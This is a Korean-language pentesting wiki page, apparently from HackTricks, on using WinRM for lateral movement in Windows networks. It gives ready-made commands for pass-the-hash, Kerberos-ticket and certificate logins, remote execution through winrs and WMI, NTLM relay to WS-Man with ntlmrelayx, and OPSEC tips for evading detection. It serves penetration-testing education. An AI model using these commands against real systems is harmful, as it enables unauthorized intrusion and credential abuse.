# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM은 Windows 환경에서 가장 편리한 **lateral movement** 전송 수단 중 하나입니다. SMB 서비스 생성 기법 없이 **WS-Man/HTTP(S)**를 통해 원격 셸을 제공하기 때문입니다. 대상에서 **5985/5986** 포트가 열려 있고 사용자가 원격 관리를 사용할 수 있다면, 흔히 "유효한 자격 증명"에서 "대화형 셸"까지 빠르게 이동할 수 있습니다.

**프로토콜/서비스 열거**, 리스너, WinRM 활성화, `Invoke-Command`, 일반적인 클라이언트 사용법은 다음을 참조하세요.

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## 운영자들이 WinRM을 선호하는 이유

- SMB/RPC 대신 **HTTP/HTTPS**를 사용하므로, PsExec 방식의 실행이 차단된 환경에서도 동작하는 경우가 많습니다.
- **Kerberos**를 사용하면 재사용 가능한 자격 증명을 대상에 전송하지 않습니다.
- **Windows**, **Linux**, **Python** 도구(`winrs`, `evil-winrm`, `pypsrp`, `netexec`)에서 원활하게 사용할 수 있습니다.
- 대화형 PowerShell remoting 경로는 인증된 사용자 컨텍스트로 대상에서 **`wsmprovhost.exe`**를 실행하므로, 서비스 기반 exec와 운영 방식이 다릅니다.

## 액세스 모델 및 사전 요구 사항

실제로 WinRM lateral movement가 성공하려면 다음 **세 가지**가 필요합니다.

1. 대상에 **WinRM listener**(`5985`/`5986`)가 있고 액세스를 허용하는 방화벽 규칙이 있어야 합니다.
2. 계정이 엔드포인트에 **인증**할 수 있어야 합니다.
3. 계정에 **remoting session을 열 권한**이 있어야 합니다.

이 액세스 권한을 얻는 일반적인 방법은 다음과 같습니다.

- 대상의 **Local Administrator** 권한.
- 최신 시스템의 **Remote Management Users** 또는 해당 그룹을 계속 적용하는 시스템/구성 요소의 **WinRMRemoteWMIUsers__** 그룹 멤버십.
- 로컬 보안 설명자 또는 PowerShell remoting ACL 변경을 통해 위임된 명시적 remoting 권한.

관리자 권한으로 장비를 이미 제어하고 있다면, 다음 기법을 사용해 전체 관리자 그룹 멤버십 없이도 **WinRM 액세스 권한을 위임**할 수 있습니다.

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### lateral movement 중 유의해야 하는 인증 관련 함정

- **Kerberos에는 호스트 이름/FQDN이 필요합니다**. IP로 연결하면 클라이언트는 보통 **NTLM/Negotiate**로 대체합니다.
- **workgroup** 환경이나 교차 trust 관련 특수 상황에서 NTLM을 사용하려면 보통 **HTTPS**가 필요하거나 클라이언트의 **TrustedHosts**에 대상을 추가해야 합니다.
- workgroup에서 Negotiate를 통해 **로컬 계정**을 사용하면, 기본 제공 Administrator 계정을 사용하거나 `LocalAccountTokenFilterPolicy=1`을 설정하지 않는 한 UAC 원격 제한으로 액세스가 차단될 수 있습니다.
- PowerShell remoting은 기본적으로 **`HTTP/<host>` SPN**을 사용합니다. **`HTTP/<host>`가 다른 서비스 계정에 이미 등록된 환경에서는 WinRM Kerberos가 `0x80090322` 오류와 함께 실패할 수 있습니다.** 포트가 지정된 SPN을 사용하거나 해당 SPN이 존재하는 경우 **`WSMAN/<host>`**로 전환하세요.<sup>[[3]](#references)</sup>

password spraying 중 유효한 자격 증명을 확보했다면, WinRM으로 검증하는 것이 해당 자격 증명으로 셸을 열 수 있는지 확인하는 가장 빠른 방법인 경우가 많습니다.

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Linux에서 Windows로의 lateral movement

### 검증 및 단일 명령 실행을 위한 NetExec / CrackMapExec

```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```

### 대화형 셸용 Evil-WinRM

`evil-winrm`은 **암호**, **NT 해시**, **Kerberos 티켓**, **클라이언트 인증서**, 파일 전송, 메모리 내 PowerShell/.NET 로딩을 지원하므로 Linux에서 가장 편리한 대화형 옵션입니다.

```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```

### Kerberos SPN 예외 사례: `HTTP` vs `WSMAN`

기본 **`HTTP/<host>`** SPN으로 인해 Kerberos 오류가 발생하면, 대신 **`WSMAN/<host>`** ticket을 요청하거나 사용해 보세요. 이는 `HTTP/<host>`가 이미 다른 service account에 연결된 강화된 보안 또는 특이한 enterprise 환경에서 나타날 수 있습니다.<sup>[[3]](#references)</sup>

```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```

이는 일반적인 `HTTP` 티켓이 아니라 **WSMAN** 서비스 티켓을 특별히 위조하거나 요청한 경우, **RBCD / S4U** 악용 이후에도 유용합니다.

### 인증서 기반 인증

WinRM은 **클라이언트 인증서 인증**도 지원하지만, 대상 시스템에서 인증서를 **로컬 계정**에 매핑해야 합니다. 공격 관점에서는 다음과 같은 상황에서 중요합니다.

- WinRM에 이미 매핑된 유효한 클라이언트 인증서와 개인 키를 탈취하거나 내보낸 경우
- **AD CS / Pass-the-Certificate**를 악용해 주체의 인증서를 얻은 다음 다른 인증 경로로 피벗한 경우
- 암호 기반 원격 접속을 의도적으로 피하는 환경에서 작업하는 경우

```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```

Client-certificate WinRM은 password/hash/Kerberos 인증보다 훨씬 드물지만, 존재하는 경우 password rotation 후에도 유지되는 **passwordless lateral movement** 경로를 제공할 수 있습니다.

### Python / `pypsrp`를 사용한 자동화

operator shell이 아닌 자동화가 필요하다면, `pypsrp`를 사용해 Python에서 **NTLM**, **certificate auth**, **Kerberos**, **CredSSP**를 지원하는 WinRM/PSRP를 이용할 수 있습니다.<sup>[[2]](#references)</sup>

```python
from pypsrp.client import Client

client = Client(
    "srv01.domain.local",
    username="DOMAIN\\user",
    password="Password123!",
    ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```


상위 수준의 `Client` 래퍼보다 세밀하게 제어해야 하는 경우, 하위 수준의 `WSMan` + `RunspacePool` API는 다음 두 가지 일반적인 운영자 문제를 해결하는 데 유용합니다.

- 많은 PowerShell 클라이언트에서 기본적으로 예상하는 `HTTP` 대신 Kerberos 서비스/SPN으로 **`WSMAN`**을 강제하는 경우
- **`Microsoft.PowerShell`** 대신 **JEA** / 사용자 지정 세션 구성이 사용하는 비기본 PSRP 엔드포인트에 연결하는 경우

```python
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool

wsman = WSMan(
    "srv01.domain.local",
    auth="kerberos",
    ssl=False,
    negotiate_service="WSMAN",
)

with wsman, RunspacePool(wsman, configuration_name="MyJEAEndpoint") as pool, PowerShell(pool) as ps:
    ps.add_script("whoami; Get-Command")
    output = ps.invoke()
    print(output)
```

### 측면 이동 중에는 사용자 지정 PSRP 엔드포인트와 JEA가 중요합니다

WinRM 인증에 성공했다고 해서 항상 기본 제한 없는 `Microsoft.PowerShell` 엔드포인트에 연결되는 것은 아닙니다. 성숙한 환경에서는 자체 ACL과 실행 계정 동작을 사용하는 **사용자 지정 세션 구성** 또는 **JEA** 엔드포인트를 노출할 수 있습니다.<sup>[[1]](#references)</sup>

Windows 호스트에서 이미 코드 실행 권한을 확보했고 어떤 원격 관리 인터페이스가 있는지 파악하려면 등록된 엔드포인트를 열거하세요:

```powershell
Get-PSSessionConfiguration | Select-Object Name, Permission
```

유용한 endpoint가 있으면 기본 shell 대신 해당 endpoint를 명시적으로 타깃으로 지정하세요:

```powershell
Enter-PSSession -ComputerName srv01.domain.local -ConfigurationName MyJEAEndpoint
```

실전 공격 관점의 의미:

- **restricted** endpoint라도 서비스 제어, 파일 액세스, 프로세스 생성 또는 임의의 .NET / 외부 명령 실행에 필요한 cmdlets/functions만 노출한다면 lateral movement에 충분할 수 있습니다.
- **misconfigured JEA** role은 `Start-Process`, 광범위한 와일드카드, 쓰기 가능한 provider 또는 의도된 제한을 우회할 수 있는 custom proxy function처럼 위험한 명령을 노출하는 경우 특히 유용합니다.
- **RunAs virtual accounts** 또는 **gMSAs**를 사용하는 endpoint는 실행하는 명령의 유효 보안 컨텍스트를 바꿉니다. 특히 gMSA 기반 endpoint는 일반적인 WinRM 세션에서 발생하는 기존 delegation 문제와 달리 **두 번째 홉에서 네트워크 identity**를 제공할 수 있습니다.

custom restricted endpoint의 경우, 실제로 적용되는 명령 권한과 script 권한을 각각 확인하세요. `Get-Command` 목록이 짧다는 사실만으로 기존 `.ps1`을 실행할 수 없다고 단정할 수는 없습니다. [JEA role capabilities](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/role-capabilities)는 호출 가능한 script 경로를 명시적으로 제어하지만, 다른 custom endpoint는 별도의 session 규칙을 적용할 수 있습니다. 허용된 script가 저장된 `SecureString`을 사용해 다른 호스트에 대한 credential을 생성한다면, 명시적 key 없이 만든 blob은 [Windows DPAPI](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring)를 사용하므로 일반적으로 복호화하려면 보호에 사용된 사용자 및 머신 컨텍스트가 필요합니다. 쓰기 가능한 소스나 복사한 blob을 호스트 간 권한 상승 경로로 간주하기 전에 script의 ACL, 허용된 호출 방식, run-as identity, 그리고 하위 시스템에서의 credential 권한을 검토하세요. 수동 열거 중에는 보호된 값을 출력하지 마세요.

파일 경로를 받는 JEA custom function의 경우, 등록된 endpoint ACL, 매핑된 role capability, 유효한 run-as identity를 함께 검토하세요. 호출자에게 `NoLanguage`가 적용되더라도 function 본문은 시스템의 기본 language mode로 실행될 수 있습니다. 또한 virtual account에 로컬 관리자 권한이 있을 수도 있습니다. function이 허용된 디렉터리를 원시 문자열 접두사로 확인한 뒤 전달된 경로를 읽는다면, `..` 구성 요소를 통해 해당 디렉터리 밖의 경로에 접근할 수 있습니다. 경계는 호출자의 language mode나 겉으로 보이는 접두사가 아니라, function의 identity로 확인한 정규화 경로입니다. 읽을 수 있는 `.psrc` 또는 `.pssc` 파일을 권한 있는 파일 읽기 취약점으로 판단하기 전에, 접근 가능한 function과 최종 경로 검증을 확인하세요. Microsoft의 [JEA role capability](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/role-capabilities) 및 [security considerations](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations) 지침을 참조하세요.

## Windows-native WinRM lateral movement

### `winrs.exe`

`winrs.exe`는 기본 제공 도구이며, 대화형 PowerShell remoting session을 열지 않고 **native WinRM command execution**을 수행할 때 유용합니다:

```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```

두 가지 플래그는 잊기 쉽지만 실제로 중요합니다.

- 원격 주체가 로컬 관리자가 **아닌** 경우 `/noprofile`이 필요한 경우가 많습니다.
- `/allowdelegate`를 사용하면 원격 셸에서 자격 증명을 **제3의 호스트**에 사용할 수 있습니다(예: 명령에 `\\fileserver\share`가 필요한 경우).

```cmd
winrs -r:srv01.domain.local /noprofile cmd /c set
winrs -r:srv01.domain.local /allowdelegate cmd /c dir \\fileserver.domain.local\share
```

운영 측면에서 `winrs.exe`는 일반적으로 다음과 유사한 원격 프로세스 체인을 생성합니다:

```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```

서비스 기반 exec 및 대화형 PSRP 세션과 다르므로 기억해 둘 가치가 있습니다.

### `winrm.cmd` / PowerShell remoting 대신 WS-Man COM 사용

`Enter-PSSession`을 사용하지 않고도 WS-Man을 통해 WMI 클래스를 호출하여 **WinRM transport**로 실행할 수 있습니다. 이 방식은 전송에는 WinRM을 사용하고, 원격 실행 프리미티브로는 **WMI `Win32_Process.Create`**를 사용합니다:

```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```

다음과 같은 경우에 유용합니다.

- PowerShell 로깅을 집중적으로 모니터링하는 경우
- **WinRM transport**를 사용하고 싶지만 기존 PS remoting 워크플로는 원하지 않는 경우
- **`WSMan.Automation`** COM object를 사용하는 사용자 지정 도구를 만들거나 사용하는 경우

## WinRM(WS-Man)에 대한 NTLM relay

SMB relay가 signing으로 차단되고 LDAP relay가 제한된 경우에도 **WS-Man/WinRM**은 여전히 매력적인 relay target일 수 있습니다. 최신 `ntlmrelayx.py`에는 **WinRM relay servers**가 포함되어 있어 **`wsman://`** 또는 **`winrms://`** target으로 relay할 수 있습니다.

```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```

Two 가지 실용적인 참고 사항:

- 대상이 **NTLM**을 허용하고 릴레이된 주체에 WinRM 사용 권한이 있을 때 Relay가 가장 유용합니다.
- 최근 Impacket 코드는 **`WSMANIDENTIFY: unauthenticated`** 요청을 특별히 처리하므로 `Test-WSMan`과 같은 프로브가 Relay 흐름을 중단시키지 않습니다.

첫 번째 WinRM 세션을 확보한 뒤의 멀티 홉 제약 사항은 다음을 확인하세요.

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## OPSEC 및 탐지 참고 사항

- **Interactive PowerShell remoting**은 일반적으로 대상에서 **`wsmprovhost.exe`**를 생성합니다.
- **`winrs.exe`**는 흔히 **`winrshost.exe`**를 생성한 다음 요청된 자식 프로세스를 생성합니다.
- 사용자 지정 **JEA** 엔드포인트는 **`WinRM_VA_*`** 가상 계정 또는 구성된 **gMSA**로 작업을 실행할 수 있습니다. 이 경우 일반 사용자 컨텍스트 셸과 비교해 텔레메트리와 두 번째 홉 동작이 모두 달라집니다.<sup>[[1]](#references)</sup>
- PSRP를 사용한다면 raw `cmd.exe`를 사용하는 경우와 달리 **네트워크 로그온** 텔레메트리, WinRM 서비스 이벤트, PowerShell 운영 및 스크립트 블록 로깅이 발생할 수 있습니다.
- 단일 명령만 필요한 경우 `winrs.exe` 또는 일회성 WinRM 실행이 오래 유지되는 대화형 remoting 세션보다 탐지 가능성이 낮을 수 있습니다.
- Kerberos를 사용할 수 있다면 IP + NTLM보다 **FQDN + Kerberos**를 우선 사용해 신뢰 문제와 클라이언트 측 `TrustedHosts` 설정 변경을 모두 줄이세요.

## References

- [1] [Microsoft: JEA 보안 고려 사항](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations?view=powershell-7.6)
- [2] [pypsrp README](https://github.com/jborean93/pypsrp)
- [3] [Microsoft: WinRM을 통해 PowerShell을 원격 서버에 연결할 때 발생하는 오류 `0x80090322`](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)
{{#include ../../banners/hacktricks-training.md}}
